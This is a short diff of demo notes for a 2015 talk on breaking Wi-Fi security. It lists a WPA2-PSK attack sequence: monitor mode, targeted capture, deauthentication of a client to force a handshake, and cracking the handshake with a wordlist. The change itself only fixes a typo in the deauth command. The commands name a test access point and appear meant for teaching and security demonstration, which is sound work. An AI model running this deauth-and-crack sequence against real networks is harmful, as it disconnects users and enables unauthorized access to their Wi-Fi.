@@ -11,7 +11,7 @@ iwlist wlan0 scanning
 service network-manager stop
 airmon-ng start wlan0 6
 airodump-ng mon0 --bssid <Test AP> --channel 6 --write /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo
-aireplay-ng -0 20 -a <Test AP> -c <Test Client) -e <ESSID> mon0
+aireplay-ng -0 20 -a <Test AP> -c <Test Client> -e <ESSID> mon0
 
 ## Crack the handshake (One or the other)
 aircrack-ng /root/Desktop/2015-07-07\ -\ Pittsburgh\ Code\ and\ Supply\ -\ Breaking\ Wireless\:\ \ The\ Dos\ and\ Don\'ts\ of\ Wi-Fi/WPA2-PSK_Demo-01.cap -w /usr/share/wordlists/fasttrack.txt
